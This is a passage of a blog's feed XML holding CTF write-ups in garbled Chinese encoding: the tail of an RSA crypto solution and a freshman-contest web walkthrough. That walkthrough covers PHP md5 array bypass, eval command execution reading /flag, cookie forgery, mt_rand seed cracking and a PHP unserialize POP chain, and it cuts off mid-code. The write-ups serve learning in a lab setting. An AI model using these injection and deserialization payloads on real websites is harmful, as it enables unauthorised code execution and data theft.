class="number">3304124639719334349997663632110579306673932777705840648575774671427424134287680988314129312593361087606243819528298610131797078262351307396831985397555390640151391138633431951746748156610463582479645561779194981806129898009876517899450840875569675976765155608446799203699927448835004756707151281044859676695533373755798273892503194753948997947653100690841880925445059175494314198605475023939567750409907217654291430615102258523998394231436796902635077995829477347316754739938980814293304289318417443493019704073164585505217658570214989150175123757038125380996050761572021986573934155470641091678664451080065719261207</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>) * (np - <span class="number">1</span>) * (nq - <span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜ç®—çš„æ—¶å€™è¿˜ç®—è½»æ¾çš„, çŒœå‡ºç»„åˆä¹‹åç”¨deltaçˆ†ç ´ä¹Ÿä¸æ˜¯ç¬¬ä¸€æ¬¡åšäº†</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>è¿˜æ˜¯å¤ªèœâ€¦èƒ½åšçš„å°±åªæœ‰ç®€å•çš„â€¦<br>å‰©ä¸‹çš„å¯†ç é¢˜è¿˜æœ‰</p><ol><li>more_calc </li><li>Exposure</li><li>easy matrix</li><li>Blowfish</li></ol><h2 id="more-calc"><a href="#more-calc" class="headerlink" title="more_calc"></a>more_calc</h2><blockquote><p>çœ‹è¿‡äº†Nu1lçš„WP, Sç¡®å®æ˜¯å¯ä»¥ç”¨åˆ«çš„åŠæ³•ç®—çš„â€¦è¿™å‡ å¤©ä¸€å®šè¦æŠŠåŸç†ææ‡‚(è¿™ä¸ªåº”è¯¥ä¸éš¾</p></blockquote><h2 id="Exposureå’Œeasy-matrix"><a href="#Exposureå’Œeasy-matrix" class="headerlink" title="Exposureå’Œeasy matrix"></a>Exposureå’Œeasy matrix</h2><p>éƒ½æ˜¯éœ€è¦ç”¨åˆ°LLLçš„çŸ¥è¯†çš„â€¦è¿™ä¸ªçœŸçš„è¿˜æ²¡å­¦ä¼š åƒäº†å¤§äº, æ ¼ç†è®ºçœŸçš„è¦å¥½å¥½çš„å»æŸ¥ä¸€æŸ¥èµ„æ–™äº†<br>ç‰¹åˆ«æ˜¯Exposureâ€¦è®ºæ–‡éƒ½æŸ¥åˆ°äº†!å°±æ˜¯å› ä¸ºä¸ä¼šLLLå°±ä¸ä¼šåšäº†(å¥½èœå•Š</p><blockquote><p>ä¸€å®šè¦å­¦ä¼šLLL!</p></blockquote><h2 id="Blowfish"><a href="#Blowfish" class="headerlink" title="Blowfish"></a>Blowfish</h2><blockquote><p>ç¬¬ä¸€æ¬¡æ¥è§¦Blowfish, å…ˆæš‚æ—¶æ”¾ç€å§..</p></blockquote><h1 id="çœŸã®æ€»ç»“"><a href="#çœŸã®æ€»ç»“" class="headerlink" title="çœŸã®æ€»ç»“"></a>çœŸã®æ€»ç»“</h1><p>å¾ˆå¤šç†è®ºçŸ¥è¯†è¿˜æ²¡æœ‰å­¦ä¼šå§. çœŸçš„æ„Ÿè§‰é¢˜ç›®æ˜¯æ°´çš„, è‡ªå·±èœåšä¸å‡ºæ¥è€Œå·².<br>ç„¶åå°±æ˜¯å…³äºRSA, åšäº†è¿™æ¬¡æ˜ç™½äº†å…¶å®å¾ˆå¤šæ—¶å€™ç”¨åˆ°çš„æ–¹æ³•éƒ½æ˜¯å·²ç»å­¦è¿‡çš„, è§‚å¯Ÿé¢˜ç›®ç»™çš„æ¡ä»¶çš„ç‰¹ç‚¹, å†æƒ³æƒ³è‡ªå·±ä¼šçš„æ–¹æ³•çš„ç‰¹ç‚¹(è´¹é©¬åˆ†ä¸¤ä¸ªæ¥è¿‘pq, wieneré€‚åˆç‰¹åˆ«å¤§çš„eç­‰ç­‰. è¿™æ ·åšçš„å¯èƒ½ä¼šæ›´æœ‰æ€è·¯æ›´å¿«ä¸€ç‚¹</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;åªä¼šåšå¯†ç çš„èœé¸¡&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;Crypto&quot;&gt;&lt;a href=&quot;#Crypto&quot; class=&quot;headerlink&quot; title=&quot;Crypto&quot;&gt;&lt;/a&gt;Crypto&lt;/h1&gt;&lt;h2 id=&quot;0x01-S</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/categories/WriteUp/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="RSA" scheme="http://tearsjin.github.io/tags/RSA/"/>
    
    <category term="Lattice" scheme="http://tearsjin.github.io/tags/Lattice/"/>
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>writeup for 2020 æ–°ç”Ÿæ¯</title>
    <link href="http://tearsjin.github.io/2020/11/12/writeup-for-2020-%E6%96%B0%E7%94%9F%E6%9D%AF/"/>
    <id>http://tearsjin.github.io/2020/11/12/writeup-for-2020-%E6%96%B0%E7%94%9F%E6%9D%AF/</id>
    <published>2020-11-12T01:05:28.000Z</published>
    <updated>2021-04-06T09:30:31.318Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>è¿™æ¬¡é¡¶ç€æ¡è€çˆ·çš„id(kirito zbds, æœ¬æ¥åªæ˜¯æƒ³ç€åšåšWebå’Œå°è¯•åšå®ŒCryptoçš„(ç»“æœæ²¡æœ‰åšå®Œ,æœ‰è¶£çš„åŠ å¯†<del>æ˜¯çœŸçš„æœ‰è¶£</del>, ç»“æœå‘ç°ä¸åšMiscåˆ†ä¸å¤ªå¤Ÿ, å°±è‚äº†å‡ é“, è¿˜æ˜¯å­¦åˆ°äº†ä¸å°‘ä¸œè¥¿çš„.</p></blockquote><p>æ‰€ä»¥å…ˆæ¥ä¸ªç›®å½•å§(pwnçœŸçš„æ˜¯ä¸€é“éƒ½ä¸ä¼šå—¯â€¦:</p><p>Web</p><ul><li><a href='#1'>å‡çš„ç­¾åˆ°</a></li><li><a href='#2'>ä¸–ç•Œä¸Šæœ€ç®€å•çš„åé—¨</a></li><li><a href='#3'>Letâ€™s play a simple game again</a></li><li><a href='#4'>lottery_revenge</a></li><li><a href='#5'>unserialize</a></li><li><a href='#6'>åˆä¸€ä¸ªåé—¨</a></li><li><a href='#7'>babysql</a></li><li><a href='#8'>babyssrf</a></li></ul><p>OSINT</p><ul><li><a href='#9'>checkin</a></li></ul><p>REVERSE</p><ul><li><a href='#10'>æ‰è¿·è—</a></li><li><a href='#11'>basic_hash</a></li><li><a href='#12'>ByteCode</a></li></ul><p>Misc</p><ul><li><a href='#13'>çœŸÂ·ç­¾åˆ°</a></li><li><a href='#14'>Look_at_your_keyboard</a></li><li><a href='#15'>Buddha</a></li><li><a href='#16'>Do you know Xp0int</a></li><li><a href='#17'>close_base</a></li><li><a href='#18'>PMGBA</a></li><li><a href='#19'>é›†é½äº”é¾™ç </a></li></ul><p>Cyrpto</p><ul><li><a href='#20'>ç¢°ç¢°è½¦</a></li><li><a href='#21'>EasyRSA</a></li><li><a href='#22'>Go Home</a></li><li><a href='#23'>block cipher</a></li><li><a href='#24'>ant forest</a><br><a name='1'></a></li></ul><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="å‡çš„ç­¾åˆ°"><a href="#å‡çš„ç­¾åˆ°" class="headerlink" title="å‡çš„ç­¾åˆ°"></a>å‡çš„ç­¾åˆ°</h2><p>robots! robots! robots! robotsåè®®<br>è¿™ä¸ªåè®®é‡Œé¢æ˜¯ç”¨æ¥è®¾å®šä¸€äº›ç½‘ç«™é‡Œä¸èƒ½è¢«æœç´¢å¼•æ“è·å–çš„å†…å®¹çš„(ä¸è¿‡CTFé‡Œå°±å˜æˆæç¤ºåšé¢˜äººæ–¹å‘çš„ä¸€ä¸ªæ–‡ä»¶äº†?<br>ä¸€èˆ¬æ‹¿åˆ°webè¯´ä¸å®šrobots.txté‡Œé¢å°±æœ‰æç¤ºå‘¢<del>ä¸è¿‡å¤§æ¦‚ç‡æ˜¯æ²¡æœ‰çš„</del></p><p>æ‰€ä»¥é©¬ä¸Šè¿›/robots.txtçœ‹çœ‹, é‡Œé¢æœ‰ä¸ªæç¤º:/phpp_tql.php<br>è®¿é—®/phpp_tql.phpæœ‰ä¸€æ®µæºç <br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-c3a1121734864c0d88c7d4bbb4e511db.png" alt="å›¾ç‰‡.png"><br>çœ‹äº†ä¸‹æ˜¯å…³äºmd5çš„æ¯”è¾ƒçš„,å› ä¸ºæ˜¯===, è‚¯å®šä¸ä¼šæ˜¯å¼±ç±»å‹äº†, æƒ³èµ·ä¹‹å‰å°±æŒ–è¿‡ä¸€ä¸ªå‘<a href="http://47.98.130.190:8090/archives/web-md5sha%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83">æŸç¯‡MD5çš„æ€»ç»“</a>, æ‰€ä»¥å¾ˆå¿«å°±æƒ³åˆ°ç”¨æ•°ç»„æ¥åšäº†.</p><p><strong>å½“aå’Œbéƒ½æ˜¯æ•°ç»„çš„æ—¶å€™, md5(a) === md5(b) ä¼šåˆ¤æ–­ä¸ºçœŸ.</strong><br>åˆ©ç”¨è¿™ä¸ªå°±å¯ä»¥æ„é€ payload: <code>?phpp[]=1&amp;hphh[]=2</code><br><a name='2'></a></p><h2 id="ä¸–ç•Œä¸Šæœ€ç®€å•çš„åé—¨"><a href="#ä¸–ç•Œä¸Šæœ€ç®€å•çš„åé—¨" class="headerlink" title="ä¸–ç•Œä¸Šæœ€ç®€å•çš„åé—¨"></a>ä¸–ç•Œä¸Šæœ€ç®€å•çš„åé—¨</h2><p><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-7523c61da6594c3daaef38a5131d36b4.png" alt="å›¾ç‰‡.png"><br>å•Šè¿™, eval()çœŸçš„å¾ˆå®‰å…¨çš„.<br>å…³äºç›´æ¥æŠŠç”¨æˆ·çš„è¾“å…¥ç›´æ¥æ”¾åœ¨eval()ä¸­å¯¼è‡´ç›®å½•éƒ½è¢«ç¿»äº†ä¸ªéè¿™æ¡£äº‹(<br>ä¹Ÿæ²¡æƒ³å¤ªå¤š, æ‰‹åŠ¨ç¿»äº†ä¸€ä¸‹ç›®å½•(dalaoéƒ½æ˜¯ç›´æ¥æœç´¢flagçš„<br>å¾€ä¸Šç¿»ä¸€ä¸ªç›®å½•<code>system(&#39;ls /&#39;);</code>å°±å‘ç°æœ‰flagäº†<br>äºæ˜¯æå‡ºhackbar(POST) <code>c=system(&#39;cat /flag&#39;);</code><br><a name='3'></a></p><h2 id="Letâ€™s-play-a-simple-game-again"><a href="#Letâ€™s-play-a-simple-game-again" class="headerlink" title="Letâ€™s play a simple game again"></a>Letâ€™s play a simple game again</h2><p>å¼€å¤´æ ¹æ®è¦æ±‚GETå’ŒPOSTä¼ å‚å°±è¡Œäº†.<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-bbf65015412b431eab2aa9e23f8723cd.png" alt="å›¾ç‰‡.png"><br>ä½†æ˜¯è¿™é‡Œå¥½åƒå‡ºäº†ä¸€ä¸ªå°é—®é¢˜. åšé¢˜çš„æ—¶å€™éƒ½æ˜¯æƒ³ç€æ€ä¹ˆåšå¿«å°±æ€ä¹ˆåš. äºæ˜¯ç»™ä¸»åŠæ–¹æäº¤wpçš„æ—¶å€™ä¼¼ä¹é—æ¼äº†ä»€ä¹ˆ(ä¸è¦æ‰“æˆ‘æˆ‘çœŸçš„æ˜¯åæ¥æ‰å‘ç°çš„â€¦</p><p>ä¸æ˜¯adminå°±è¿›ä¸å»å—! å…¶å®ç¬¬ä¸€æƒ³æ³•åº”è¯¥å°±æ˜¯X-Forwarded-Foræ”¹127.0.0.1çš„, ç„¶è€Œæˆ‘ç›´æ¥å»çœ‹Cookiesäº†, ä¹Ÿæ²¡æœ‰æ”¹XFF(X-Forwarded-For</p><p>å‘ç°<code>Cookies: YWRtaW49MA==</code>, ä¸¤ä¸ªç­‰å·åæœ‰å…«ä¹æ˜¯base64äº†, æ‰”å»base64è§£ç å‡ºæ¥çš„æ˜¯<code>admin=0</code>, æƒ³ç€è®©Cookiesä¸º<code>admin=1</code>åº”è¯¥æ²¡é—®é¢˜äº†. æ‰€ä»¥å°†Cookiesæ”¹æˆ<code>YWRtaW49MQ==</code>, å°±æ‹¿åˆ°<code>Welcome admin! Here is your flag:ctf&#123;Have_4_n1ce_c0mpetition!&#125;</code>äº†.</p><p>ç„¶è€Œâ€¦äº‹æƒ…å¹¶æ²¡æœ‰è¿™ä¹ˆç®€å•, æ˜¨å¤©æŸå¾¡å‚å¤§ä½¬å‘äº†è‡ªå·±çš„wpä¹‹åæˆ‘å‘ç°, ä»€ä¹ˆ???X-Forwarded-Forè¦æ”¹127.0.0.1???, æˆ‘æ²¡æ”¹æ€ä¹ˆæ‹¿åˆ°flagäº†???<br>äºæ˜¯çœ‹äº†çœ‹è‡ªå·±çš„firefoxæ’ä»¶â€¦<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-6b3d3e511cf849dbb10063a1442afc3c.png" alt="å›¾ç‰‡.png"><br>å±®â€¦åŸæ¥æ˜¯ä¹‹å‰åšäº†é¢˜å°±æ²¡æœ‰å…³æ‰è¿™ä¸ª, å¯¼è‡´è‡ªå·±ä¸€ç›´éƒ½æ˜¯127.0.0.1â€¦<br>æ‰€ä»¥ç›´æ¥å°±å‡ºflagäº†â€¦<br>ä½†æ˜¯wpå·²ç»æäº¤äº†å•Š! ä¹Ÿæ²¡åŠæ³•æ”¹äº†, è¯´å®è¯æœ‰ç‚¹æ…Œâ€¦<br><a name='4'></a></p><h2 id="lottery-revenge"><a href="#lottery-revenge" class="headerlink" title="lottery_revenge"></a>lottery_revenge</h2><p>å»å¹´ä¹Ÿæœ‰æŠ½å¥–, ä¸€æ ·çš„é¡µé¢, ä¸ä¸€æ ·çš„å‘³é“â€¦(ä¼ªéšæœºæ•°çš„æ”»å‡»å±…ç„¶åœ¨webé‡Œé¢å‡ºç°äº†â€¦</p><p>å› ä¸ºå»å¹´åšè¿‡, æ‰€ä»¥ä¸Šæ¥ç›´æ¥å°±å¼€æŠ½äº†(burpsuiteæ°¸è¿œçš„ç¥, ä½†æ˜¯å‘ç°ä¸æ–­è®¿é—®data.phpéƒ½æ˜¯åŒä¸€ä¸ªå“åº”, æœ‰ç‚¹ä¸å¤ªå¯¹åŠ².<br>æ‰€ä»¥çœ‹äº†çœ‹å“åº”å‘ç°äº†ä¸€æ®µæ³¨é‡Š</p><p><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-fc6b045f35f149dd8b50dc4528d28ff7.png" alt="å›¾ç‰‡.png"></p><p>å•Šâ€¦æŠ½å¥–å®ƒ, å®ƒå‡çº§äº†.<br>è¦æ±‚<code>$_POST[&#39;admin_key&#39;]==$_SESSION[&#39;key&#39;]</code> </p><p>sessionå°±æ˜¯æ—¶é—´æˆ³å§. ç¬¬ä¸€ä¸ªæƒ³æ³•æ˜¯å…ˆå–ç°åœ¨çš„æ—¶é—´æˆ³åŠ ä¸Šä¸€ä¸ªå¸¸æ•°ç„¶åä¸åœè®¿é—®. ä½†æ˜¯æ€æ ·éƒ½è®¿é—®ä¸æˆåŠŸ(äº‹å®ä¸Šå°±ç®—è®¿é—®æˆåŠŸäº†ä¹Ÿå°±æŠ½äº†ä¸€æ¬¡å¥–, ä¸‹ä¸€æ¬¡è¿˜å¾—é‡æ–°æ„é€ æ–°çš„æ—¶é—´æˆ³â€¦</p><p>å…¶å®è¿™é‡Œå¡äº†ä¸€æ®µæ—¶é—´(æˆ‘ä¹Ÿä¸çŸ¥é“è‡ªå·±åˆ°åº•çˆ†ç ´äº†å¤šä¹…â€¦, å‘ç°æ€æ ·éƒ½ä¸è¡Œåå°±å»çœ‹äº†ä¸‹$_SESSIONå˜é‡æœ‰æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ç‰¹æ€§æˆ–è€…æ¼æ´. è¿˜çœŸå°±å‘ç°äº†ä¸€ä¸ªç‰¹æ€§:<strong>å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®çš„æ—¶å€™,$_SESSIONçš„æ‰€æœ‰å˜é‡éƒ½æ˜¯ä¸ºç©ºçš„(å°±æ˜¯è¯´åˆå§‹åŒ–ä¸ºç©ºå˜›</strong>, å¯ä»¥çœ‹ä¸€ä¸‹æºç , ç»™<code>$_SESSION[&#39;key&#39;]</code>èµ‹å€¼æ˜¯åœ¨ä¸€æ¬¡è®¿é—®ä¹‹å, æ‰€ä»¥!</p><p>åªéœ€è¦ä¸å¸¦Cookiesä»¥åŠå¸¦ä¸Šç©ºçš„admin_keyè®¿é—®data.phpå°±å¯ä»¥å¼€å§‹æŠ½å¥–å•¦.<br>æŠ½å‡ºç»“æœè¿˜æ˜¯å¾ˆå¼€å¿ƒçš„, ä½†æ˜¯ç»“æœè¿˜éœ€è¦ä¸‹ä¸€æ­¥â€¦<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-f657ee08e09a4a97a063d9fd76f10eb5.png" alt="å›¾ç‰‡.png"></p><p>ç¦»è°±, æŒ‰ç€æç¤ºè¿›å»<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-424af361456148ddaa656b953ec9c0e7.png" alt="å›¾ç‰‡.png"></p><p>ä¸€å¼€å§‹æ²¡æ‡‚è¿™ä¸ªé¡µé¢è¦æˆ‘å¹²å˜›, çœ‹çœ‹æ³¨é‡Šæœ‰æ²¡æœ‰æç¤º, å‘ç°ä¸‹é¢æœ‰ä¸ªsource=1<br>dddd, ?source=1çœ‹æºç </p><p><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-2ec42f08584f42debb5b0bcbc585174d.png" alt="å›¾ç‰‡.png"></p><p>å¤§æ¦‚æ˜¯è¯´éšæœºç”Ÿæˆ30ä¸ªæ•°, å¯¹åº”ä¸€ä¸ªè¡¨ä¸­çš„30ä¸ªå­—æ¯ç”Ÿæˆä¸€ä¸ªéšæœºçš„å­—ç¬¦ä¸², ç»™å‡ºå‰11ä½çŒœæ•´ä¸ªå­—ç¬¦ä¸².</p><p>æ¯•ç«Ÿåšäº†æŒºå¤šä¼ªéšæœºæ•°çš„é¢˜äº†, çœ‹åˆ°<code>mt_rand()</code>å°±æƒ³èµ·ä¹‹å‰å·®ç‚¹æ²¡æŠŠæˆ‘æ•´åçš„MT-19937.(å½“ç§å­è®¾å®šæ¯æ¬¡éšæœºå‡ºæ¥çš„æ•°éƒ½æ˜¯ä¸€æ¨¡ä¸€æ ·æ˜¯ä¸æ˜¯å¾ˆç¥å¥‡å•Š! N1CTFé‚£é“ä¼ªéšæœºæ•°è¿˜å†å†åœ¨ç›®.</p><p>æ‰€ä»¥è¯´, ç†è®ºä¸ŠçŸ¥é“éšæœºæ•°å‰é¢çš„å‡ ä½è¾“å‡ºæ˜¯å¯ä»¥é€†æ¨å›ç§å­çš„(æœ‰æ—¶å€™éœ€è¦è¶³å¤Ÿå¤šçš„è¾“å‡ºæ‰èƒ½å¾—åˆ°ç§å­, ä½†å…·ä½“é€†çš„ç®—æ³•è‚¯å®šä¸æ˜¯è¿™é¢˜çš„è€ƒç‚¹(<del>è€ƒäº†æˆ‘ä¹Ÿé€†ä¸å‡ºæ¥, pythonè„šæœ¬å€’æ˜¯æœ‰ä¸€ä¸ªâ€¦</del></p><p>æ‰€ä»¥å»æœäº†ä¸€ä¸‹æœ‰æ²¡æœ‰æ”»å‡»<code>mt_rand()</code>çš„è„šæœ¬. çœŸå°±æœ‰ä¸€ä¸ªphp_mt_seed, githubä¸Šå°±æœ‰äº†. ä½†æ˜¯åšçš„æ—¶å€™è¿™é‡Œè¸©äº†ä¸€ä¸ªå¤§å‘, githubä¸Šé¢çš„æ˜¯ä½ç‰ˆæœ¬çš„è„šæœ¬, æ‰€ä»¥å¯¼è‡´è·‘äº†ä¸€ä¸‹åˆéƒ½æ²¡æœ‰è·‘å‡ºç»“æœæ¥. </p><p>ç›´åˆ°æ™šä¸Šå‘ç°åˆ«äººçš„blogç”¨çš„æ˜æ˜¾ä¸æ˜¯ä¸€ä¸ªç‰ˆæœ¬çš„è„šæœ¬! æ‰å»æ‰¾äº†æ‰¾å‘ç°çœŸæœ‰ä»æœªä½“éªŒè¿‡çš„èˆ¹æ–°ç‰ˆæœ¬, é©¬ä¸Šæ‰”è¿›è™šæ‹Ÿæœºè·‘, ä¸åˆ°ä¸€åˆ†é’Ÿå°±å‡ºç»“æœäº†.<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-d72e71e29d1a403991af5990f5eccc43.png" alt="å›¾ç‰‡.png"></p><p>æ‹¿ç€åˆšå‡ºæ¥çš„ç§å­ç”Ÿæˆå­—ç¬¦ä¸²æäº¤å°±è¡Œäº†<br><a name='5'></a></p><h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h2><p>ä¸€ç›´è§‰å¾—ååºåˆ—åŒ–çœŸçš„å¾ˆæœ‰æ„æ€, å°±åƒæ¨ç†ä¸€æ ·ä¸€æ­¥ä¸€æ­¥çš„å¾€ä¸‹æ¨å‡ºpayload<br>æºç åœ¨è¿™</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getit</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;cache[<span class="variable">$key</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cache[<span class="variable">$key</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;getit(<span class="variable">$method</span>), <span class="variable">$args</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evil</span>,<span class="variable">$arggg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evallll</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        call_user_func(<span class="keyword">$this</span>-&gt;evil,<span class="keyword">$this</span>-&gt;arggg);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;sssssss&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>é¦–å…ˆcall_user_func()å¯ä»¥æ‰§è¡Œphpä¸­çš„å‡½æ•°, åŒ…æ‹¬<code>system(), assert()</code>è¿™äº›å±é™©çš„å‡½æ•°</p><p>è€Œæºç é‡Œé¢åªæœ‰åœ¨ç±»Cä¸­çš„call_user_func()æ˜¯å¯ä»¥è‡ªå·±ç»™å®šæ‰§è¡Œçš„å‡½æ•°å’Œæ‰€ç”¨çš„å‚æ•°çš„, å˜é‡<code>$evil</code>å’Œå‡½æ•°<code>evallll()</code>ä¹Ÿæç¤ºäº†å±é™©å‡½æ•°å°±å‡ºç°åœ¨ç±»Cä¸­, æ‰€ä»¥ç°åœ¨çš„ç›®çš„å°±æ˜¯æƒ³åŠæ³•è°ƒç”¨ç±»Cä¸­çš„<code>evallll()</code></p><p>ååºåˆ—åŒ–çš„é¢˜åŸºæœ¬ç¦»ä¸å¼€é­”æ³•å‡½æ•°, æ‰¾äº†ä¸€ä¸‹, è¿™é‡Œçš„å‡ºç°äº†<code>__destruct()</code>å’Œ<code>__call($method, $args)</code>.</p><p>å¯¹äº<code>__destruct()</code>, å½“æŸä¸ªå¯¹è±¡è¢«é”€æ¯çš„æ—¶å€™å¦‚æœå­˜åœ¨è¿™ä¸ªæ–¹æ³•å°±ä¼šè°ƒç”¨å®ƒ. ç¨‹åºç»“æŸè‚¯å®šä¼šé”€æ¯å‘€.</p><p>è€Œå¯¹äº<code>__call()</code>:<br><strong>å½“æŸä¸ªå¯¹è±¡çš„ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•è¢«è°ƒç”¨æ—¶, å¦‚æœ__callæ–¹æ³•å­˜åœ¨, åˆ™ä¼šè°ƒç”¨__callæ–¹æ³•, ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ‰€è°ƒç”¨çš„é‚£ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•å, ç¬¬äºŒä¸ªå‚æ•°æ˜¯è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶çš„å‚æ•°.</strong></p><p>å› ä¸ºAä¸­çš„<code>__destruct()</code>ä¼šè°ƒç”¨<code>$data-&gt;close()</code>, æ‰€ä»¥èƒ½é è¿™ä¸ªä»Aè¿›å…¥Bçš„<code>__call</code>. </p><p>å†çœ‹çœ‹Bä¸­çš„<code>call_user_func_array($this-&gt;getit($method), $args);</code><br>å…¶å®å°±æ˜¯<code>call_user_func_array($this-&gt;cache[$key], $args);</code></p><p>åšåˆ°è¿™é‡Œæˆ‘å°±å¡ä½äº†, å› ä¸º<code>$args</code>å¹¶ä¸å¯æ§, æ‰€ä»¥ä¸€æ—¶åŠä¼šæƒ³ä¸åˆ°æ€æ ·é€šè¿‡Bä¸­çš„è¿™ä¸ªå‡½æ•°å»è¿›å…¥C. äºæ˜¯å†³å®šå»çœ‹çœ‹<code>call_user_func_array();</code>çš„æ‰‹å†Œ.</p><p>è¿™æ‰çŸ¥é“åŸæ¥è¿™ä¸ªå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥æ˜¯ä¸€ä¸ªæ•°ç»„,å…·ä½“æ˜¯è¿™æ ·:<code>[å¯¹è±¡,å¯¹è±¡çš„æ–¹æ³•]</code>, è¿™æ ·å°±å¯ä»¥è°ƒç”¨Cä¸­çš„<code>evallll()</code>äº†!</p><p>æ‰€ä»¥åªéœ€è¦æœ‰:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Cä¸­:</span><br><span class="line"><span class="variable">$evil</span> = <span class="string">&#x27;system()&#x27;</span>;</span><br><span class="line"><span class="variable">$arggg</span> = cmd; <span class="comment"># å…·ä½“å°±æ˜¯éœ€è¦æ‰§è¡Œçš„æŒ‡ä»¤</span></span><br><span class="line"></span><br><span class="line">class Bä¸­:</span><br><span class="line"><span class="variable">$cache</span>[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> C,<span class="string">&#x27;evallll&#x27;</span>]</span><br><span class="line"></span><br><span class="line">class Aä¸­:</span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">new</span> B</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥ä»»æ„æ‰§è¡Œå‘½ä»¤äº†. è‡³äºæ„é€ payload, åˆ©ç”¨phpå°±èƒ½æ„é€ äº†.<br>é™„ä¸Šæ„é€ çš„ä»£ç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 